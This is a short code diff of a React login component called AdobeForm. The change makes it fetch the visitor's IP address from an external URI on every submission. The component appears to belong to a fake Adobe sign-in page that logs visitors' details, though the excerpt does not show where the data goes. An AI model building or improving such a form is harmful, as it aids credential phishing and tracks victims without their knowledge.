@@ -23,16 +23,13 @@ function AdobeForm({ Login, error }) {
     }
 
     // get IpAddress
-
-    if (error == "" && counter >= 2) {
-      function getIPAddress() {
-        fetch(ipUri)
-          .then((response) => response.json())
-          .then((data) => setDetails({ ...details, ip: data }));
-      }
-      getIPAddress();
+    function getIPAddress() {
+      fetch(ipUri)
+        .then((response) => response.json())
+        .then((data) => setDetails({ ...details, ip: data }));
     }
-  };
+    getIPAddress();
+  }
 
   return (
     <form method="post">
